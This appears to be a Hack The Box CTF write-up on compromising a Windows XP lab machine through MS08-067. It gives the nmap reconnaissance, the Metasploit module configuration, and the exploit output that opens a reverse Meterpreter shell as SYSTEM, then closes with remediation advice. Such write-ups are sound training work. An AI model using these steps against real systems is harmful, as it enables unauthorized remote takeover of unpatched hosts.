# CTF Report — HTB Fortresses: Legacy (MS08-067)

## 1. Overview

| Field | Value |
|---|---|
| **Platform** | Hack The Box — Fortresses |
| **Target hostname** | LEGACY |
| **Target IP** | 10.129.227.181 |
| **Attacker IP** | 10.10.14.7 |
| **Operating System** | Windows XP SP3 (Windows XP / Windows 2000 LAN Manager) |
| **Vulnerability exploited** | MS08-067 (CVE-2008-4250) |
| **Exploitation tool** | Metasploit Framework v6.4.135 |
| **Result** | SYSTEM-level Meterpreter shell obtained; user and root flags located |

## 2. Executive Summary

The target machine `LEGACY` (10.129.227.181) was assessed using standard reconnaissance and exploitation techniques. An `nmap` scan identified an outdated Windows XP host exposing SMB services with dangerous default configurations (SMB signing disabled). This host was found to be vulnerable to **MS08-067**, a critical remote code execution vulnerability in the Windows Server service (`netapi32.dll`). The vulnerability was exploited using the Metasploit module `exploit/windows/smb/ms08_067_netapi`, resulting in a Meterpreter session running with `NT AUTHORITY\SYSTEM` privileges — full administrative compromise achieved directly upon exploitation, with no separate privilege escalation step required.

## 3. Reconnaissance

An initial service and version scan was performed against the target:

```
nmap -sV -sC 10.129.227.181
```

**Key findings:**

| Port | State | Service | Version |
|---|---|---|---|
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds | Windows XP microsoft-ds |

**Host script results:**
- **OS Detection:** Windows XP (Windows 2000 LAN Manager)
- **Computer name:** legacy
- **NetBIOS computer name:** LEGACY
- **Workgroup:** HTB
- **SMB security mode:**
  - Authentication level: user
  - Challenge/response: supported
  - **Message signing: disabled** (dangerous, but default)

The combination of an unpatched Windows XP host and disabled SMB signing strongly indicated exposure to legacy SMB vulnerabilities, prompting further investigation into known exploits for this platform.

## 4. Vulnerability Identification

The target OS (Windows XP, unpatched) is a known candidate for **MS08-067**, a critical vulnerability in the SMB/Server service that allows unauthenticated remote code execution via a crafted RPC request to the `netapi32.dll` component.

- **CVE:** CVE-2008-4250
- **Metasploit module:** `exploit/windows/smb/ms08_067_netapi`

## 5. Exploitation

### 5.1 Launching Metasploit and locating the module

```
msfconsole
msf > search exploit CVE-2008-4250
```

The search returned the matching module list, confirming `exploit/windows/smb/ms08_067_netapi` as the appropriate exploit for the identified CVE.

### 5.2 Configuring the exploit

```
msf > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.227.181
RHOSTS => 10.129.227.181

msf exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
```

Module options were verified with `show options`:

| Name | Setting | Description |
|---|---|---|
| RHOSTS | 10.129.227.181 | Target host |
| RPORT | 445 | SMB service port |
| SMBPIPE | BROWSER | Named pipe used |
| LHOST | 10.10.14.7 | Listener address |
| LPORT | 443 | Listener port |
| Exploit Target | 0 – Automatic Targeting | |

### 5.3 Running the exploit

```
msf exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.7:443
[*] 10.129.227.181:445 - Automatically detecting the target...
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Sending stage (199238 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.14.7:443 -> 10.129.227.181:1046)
```

The exploit succeeded, automatically fingerprinting the target as **Windows XP SP3 English (AlwaysOn NX)** and returning a **Meterpreter session**.

## 6. Post-Exploitation

### 6.1 Privilege confirmation

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The exploit provided SYSTEM-level access immediately, with no additional privilege escalation required.

### 6.2 Dropping to a native shell

```
meterpreter > shell
Process 1104 created.
```

### 6.3 Locating the flags

**User flag** — found on the `john` user's desktop:

```
C:\Documents and Settings\john\Desktop>dir
 Directory of C:\Documents and Settings\john\Desktop
16/03/2017  09:19    <DIR>          .
16/03/2017  09:19    <DIR>          ..
16/03/2017  09:19               32  user.txt
```

**Root flag** — found on the `Administrator` desktop:

```
C:\Documents and Settings\Administrator\Desktop>dir
 Directory of C:\Documents and Settings\Administrator\Desktop
16/03/2017  09:18    <DIR>          .
16/03/2017  09:18    <DIR>          ..
16/03/2017  09:18               32  root.txt
```

Both flags (32 bytes each) were successfully located and retrieved. *(Flag contents intentionally omitted from this report per standard HTB write-up etiquette — do not publish live flag values.)*

## 7. Root Cause & Remediation

| Issue | Recommendation |
|---|---|
| Unpatched Windows XP host vulnerable to MS08-067 | Apply the MS08-067 security update, or upgrade to a supported OS — Windows XP has been end-of-life since 2014 |
| SMB message signing disabled | Enforce SMB signing on all hosts to prevent relay/tampering attacks |
| SMB/NetBIOS exposed to the network without restriction | Restrict SMB (ports 135/139/445) access via firewall rules and network segmentation |
| No compensating detection for exploitation attempts | Deploy IDS/IPS signatures for known SMB RCE patterns and monitor for anomalous RPC traffic |

## 8. Timeline Summary

| Step | Action | Result |
|---|---|---|
| 1 | `nmap -sV -sC` scan | Identified Windows XP host with SMB exposed |
| 2 | Vulnerability research | Confirmed MS08-067 (CVE-2008-4250) applicability |
| 3 | Metasploit module search & configuration | `exploit/windows/smb/ms08_067_netapi` configured |
| 4 | Exploit execution | Meterpreter session opened as SYSTEM |
| 5 | Flag collection | `user.txt` and `root.txt` located and retrieved |

## 9. Conclusion

This engagement demonstrates the continued real-world risk posed by unpatched legacy Windows systems. The MS08-067 vulnerability, though disclosed and patched in 2008, remains a reliable and highly effective vector for full system compromise when present. The exploitation chain required no credential access or lateral movement — a single unauthenticated network request against port 445 was sufficient to gain SYSTEM privileges, underscoring the importance of timely patch management and restricting exposure of internal SMB services.

---
*Report generated from CTF lab session screenshots (HTB Fortresses — target: Legacy).*
